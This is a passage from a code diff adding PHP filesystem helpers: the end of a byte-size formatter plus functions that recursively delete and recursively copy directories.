+    return round($bytes / pow($k, $i), 2) . ' ' . $sizes[$i];
+}
+
+function rrmdir($dir) {
+    if (is_dir($dir)) {
+        $objects = scandir($dir);
+        foreach ($objects as $object) {
+            if ($object != "." && $object != "..") {
+                if (is_dir($dir . DIRECTORY_SEPARATOR . $object)) {
+                    rrmdir($dir . DIRECTORY_SEPARATOR . $object);
+                } else {
+                    unlink($dir . DIRECTORY_SEPARATOR . $object);
+                }
+            }
+        }
+        rmdir($dir);
+    }
+}
+
+function rcopy($src, $dst) {
+    if (is_dir($src)) {
+        mkdir($dst, 0777, true);
+        $files = scandir($src);
+        foreach ($files as $file) {
+            if ($file != "." && $file != "..") {
+                rcopy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file);
+            }
+        }
+    } else {
+        copy($src, $dst);
+    }
+}
+?>
